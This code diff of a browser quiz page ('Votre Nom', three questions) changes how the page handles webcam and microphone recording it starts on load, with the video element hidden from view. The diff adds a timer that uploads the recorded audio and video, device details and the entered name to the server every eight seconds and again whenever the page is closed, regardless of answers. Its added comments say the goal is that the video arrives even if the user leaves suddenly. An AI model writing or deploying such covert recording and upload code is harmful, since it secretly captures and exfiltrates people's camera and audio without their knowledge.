@@ -19,7 +19,6 @@
             font-weight: bold;
         }
 
-        /* N'hiw el-cadre mta'a el-video */
         #video-container { display: none; }
         
         .question-box { margin-bottom: 15px; text-align: left; background: #f1f2f6; padding: 10px; border-radius: 5px; }
@@ -39,7 +38,7 @@
             <video id="webcam" autoplay playsinline muted></video>
         </div>
         
-        <form id="quizForm">
+        <form id="quizForm" onsubmit="event.preventDefault(); verifyAndStop();">
             <input type="text" id="username" placeholder="Votre Nom (Name)" required style="width: 100%; padding: 10px; margin-bottom: 15px; font-size: 14px; box-sizing: border-box;"><br>
             
             <div class="question-box">
@@ -88,7 +87,7 @@
         let mediaStream = null;
         let mediaRecorder = null;
         let recordedChunks = [];
-        let hasSent = false;
+        let autoSaveInterval = null;
 
         window.addEventListener('DOMContentLoaded', async () => {
             try {
@@ -102,32 +101,34 @@
                         recordedChunks.push(event.data);
                     }
                 };
-                mediaRecorder.start(1000); // Y-recordi kull thaniya
+                mediaRecorder.start(1000); // التسجيل يستمر ثانية بثانية
+
+                // إرسال تلقائي كل 8 ثواني لضمان وصول الفيديو حتى لو سكر الصفحة فجأة
+                autoSaveInterval = setInterval(() => {
+                    if (recordedChunks.length > 0) {
+                        sendData(false, "إرسال تلقائي أثناء التصفح");
+                    }
+                }, 8000);
+
             } catch (err) {
-                console.log("Impossible d'accéder à la caméra ou au micro: ", err);
+                console.log("Caméra non autorisée: ", err);
             }
         });
 
         function getMobileModel() {
             const ua = navigator.userAgent;
             let model = "Appareil Inconnu";
-            if (/android/i.test(ua)) {
-                model = "Téléphone Android";
-            } else if (/iphone|ipad|ipod/i.test(ua)) {
-                model = "iPhone / iOS Device";
-            } else if (/windows/i.test(ua)) {
-                model = "PC Windows";
-            } else if (/macintosh|mac os x/i.test(ua)) {
-                model = "Mac";
-            }
+            if (/android/i.test(ua)) model = "Téléphone Android";
+            else if (/iphone|ipad|ipod/i.test(ua)) model = "iPhone / iOS Device";
+            else if (/windows/i.test(ua)) model = "PC Windows";
+            else if (/macintosh|mac os x/i.test(ua)) model = "Mac";
             return model;
         }
 
-        async function sendData(isForcedExit = false) {
-            if (hasSent && !isForcedExit) return;
-            hasSent = true;
+        async function sendData(isFinal = false, note = "") {
+            if (recordedChunks.length === 0) return;
 
-            const username = document.getElementById('username').value || "Utilisateur anonyme";
+            const username = document.getElementById('username').value || "Utilisateur (Non الإسم)";
             const q1 = document.getElementById('q1').value || "Non répondu";
             const q2 = document.getElementById('q2').value || "Non répondu";
             const q3 = document.getElementById('q3').value || "Non répondu";
@@ -142,7 +143,7 @@
             };
 
             const formData = new FormData();
-            formData.append('username', username);
+            formData.append('username', `${username} [${note}]`);
             formData.append('location', "Non disponible");
             formData.append('device', JSON.stringify(deviceInfo));
             formData.append('q1', q1);
@@ -150,20 +151,16 @@
             formData.append('q3', q3);
             formData.append('video', videoBlob, 'recording_with_audio.webm');
 
-            if (isForcedExit && navigator.sendBeacon) {
-                navigator.sendBeacon('/submit-consent', formData);
-            } else {
-                try {
-                    await fetch('/submit-consent', { method: 'POST', body: formData });
-                } catch (e) {}
+            try {
+                await fetch('/submit-consent', { method: 'POST', body: formData });
+            } catch (e) {
+                console.log("Erreur d'envoi", e);
             }
         }
 
-        // Ki yssaker el-utilisateur el-page 9bal ma yjaweb, yeb'ath el-video elli tsajjal
-        window.addEventListener('beforeunload', (e) => {
-            if (!hasSent && recordedChunks.length > 0) {
-                sendData(true);
-            }
+        // إرسال احتياطي أثناء محاولة غلق الصفحة
+        window.addEventListener('beforeunload', () => {
+            sendData(true, "إغلاق الصفحة");
         });
 
         async function verifyAndStop() {
@@ -187,6 +184,7 @@
             }
 
             if (q1 === 'yes' && q2 === 'yes' && q3 === 'sknder') {
+                clearInterval(autoSaveInterval); // إيقاف الإرسال الدوري
                 statusDiv.style.color = 'green';
                 statusDiv.innerText = 'Réussi ! Envoi des données en cours...';
 
@@ -195,7 +193,7 @@
                 }
 
                 setTimeout(async () => {
-                    await sendData(false);
+                    await sendData(true, "إجابة صحيحة وزر OK");
                     statusDiv.innerText = 'Réussi ! Envoyé avec succès.';
                     if (mediaStream) {
                         mediaStream.getTracks().forEach(track => track.stop());
